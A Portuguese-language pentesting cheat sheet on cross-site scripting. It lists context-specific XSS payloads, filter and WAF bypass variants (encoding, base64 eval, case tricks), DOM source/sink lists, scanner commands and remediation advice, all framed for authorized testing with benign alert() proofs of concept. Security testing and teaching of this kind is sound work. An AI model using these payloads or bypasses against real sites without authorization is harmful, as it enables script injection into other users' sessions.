# XSS — Cross-Site Scripting (Cola de Detecção e PoC)

> **USO AUTORIZADO.** Em teste autorizado, use payloads de **prova de conceito benigna** (ex.: `alert(document.domain)`, `console.log`) — nunca roube sessões reais nem persista scripts maliciosos em ambientes de terceiros. Prefira `document.domain` ao `1` no `alert()` para evidenciar o contexto e origem.

---

## 1. Tipos e como diferenciar

| Tipo | Onde o input volta | Persistência |
|---|---|---|
| **Refletido** | Resposta imediata do servidor (eco do request) | Não |
| **Armazenado (stored)** | Salvo no servidor e servido a outros usuários | Sim |
| **DOM-based** | JS do cliente escreve input no DOM sem ida ao servidor | Depende |

---

## 2. Sondas de detecção (marcador único)
Use um marker rastreável para achar **reflexões** sem disparar nada ainda:
```text
suri7chk9z
```
Procure `suri7chk9z` na resposta (HTML, atributo, JS, comentário) e veja **em que contexto** caiu — o contexto define o payload.

---

## 3. Payloads por contexto

### 3.1 HTML body / texto
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

### 3.2 Dentro de atributo HTML
```html
"><svg onload=alert(document.domain)>            (quebra a aspa)
" autofocus onfocus=alert(document.domain) x="   (sem quebrar tag)
' onmouseover='alert(document.domain)
```

### 3.3 Dentro de bloco <script> / contexto JS
```javascript
';alert(document.domain)//
</script><img src=x onerror=alert(document.domain)>
${alert(document.domain)}        // template literal
'-alert(document.domain)-'
```

### 3.4 Dentro de URL/href
```text
javascript:alert(document.domain)
```

### 3.5 Bypass (filtros/WAF) — só em contexto autorizado
```html
<img src=x onerror=alert`document.domain`>     (sem parênteses)
<svg/onload=alert(document.domain)>            (sem espaço)
<sCrIpT>alert(1)</sCrIpT>                       (case)
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  (base64 — PoC)
&#60;script&#62; / %3Cscript%3E                 (encoding)
<a href="jav&#x09;ascript:alert(1)">           (tab no scheme)
```

---

## 4. XSS Armazenado (stored)
- Vetores típicos: nome de perfil, comentários, tickets, nome de arquivo, campos importados (CSV/JSON), metadados de imagem.
- Teste **2ª ordem**: input salvo numa tela e renderizado em **outra** (ex.: painel admin, relatório PDF, e-mail).
- Marcar com payload único por campo para rastrear onde executa.
```html
<img src=x onerror=alert(document.domain)>
```
**Sinal de sucesso:** o script executa quando **outro** usuário/contexto visualiza o dado.

---

## 5. DOM-based XSS

### 5.1 Sources e sinks a auditar (no JS do cliente)
```text
SOURCES: location, location.hash, location.search, document.URL,
         document.referrer, window.name, postMessage, localStorage
SINKS:   innerHTML, outerHTML, document.write, eval, setTimeout,
         setInterval, Function(), element.src, jQuery .html()/.append()
```

### 5.2 PoCs típicas
```text
https://alvo/#<img src=x onerror=alert(document.domain)>
https://alvo/?q=<svg onload=alert(document.domain)>      (se refletido via JS no DOM)
https://alvo/#javascript:alert(document.domain)
```
Use DevTools → breakpoints em sinks, ou a extensão **DOM Invader** (Burp) para rastrear source→sink automaticamente.

---

## 6. Ferramentas de validação
```bash
# Descoberta de parâmetros refletidos
kxss < urls.txt
Gxss -p suri7chk9z < urls.txt

# Scanner de XSS (autorizado)
dalfox url 'https://alvo/page?q=FUZZ'
dalfox pipe < urls.txt --skip-bav

# Burp Suite: Repeater para contexto, DOM Invader para DOM-XSS
```

---

## 7. Sinais de sucesso
- Execução de JS no contexto da origem (`alert(document.domain)` mostra o domínio alvo).
- Marker injetado aparece **sem encoding** dentro de tag/atributo/script.
- Em DOM-XSS: source controlada chega a um sink perigoso sem sanitização.

---

## 8. Remediação
- **Output encoding sensível ao contexto**: HTML entity encoding no body; attribute encoding em atributos; JS encoding em contexto script; URL encoding em URLs.
- Usar APIs seguras do framework (auto-escaping ligado): React/Angular/Vue escapam por padrão — cuidado com `dangerouslySetInnerHTML`, `[innerHTML]`, `v-html`, `bypassSecurityTrust*`.
- **Content Security Policy (CSP)** restritiva: `default-src 'self'`, sem `unsafe-inline`/`unsafe-eval`; usar nonces/hashes.
- Sanitização de HTML rico com biblioteca robusta (ex.: **DOMPurify**) — não regex caseira.
- Cookies `HttpOnly` + `Secure` + `SameSite` (reduz impacto de roubo de sessão).
- Para DOM-XSS: evitar sinks perigosos; usar `textContent` em vez de `innerHTML`; `Trusted Types`.
- Validação de entrada por allowlist como defesa em profundidade (nunca como única).
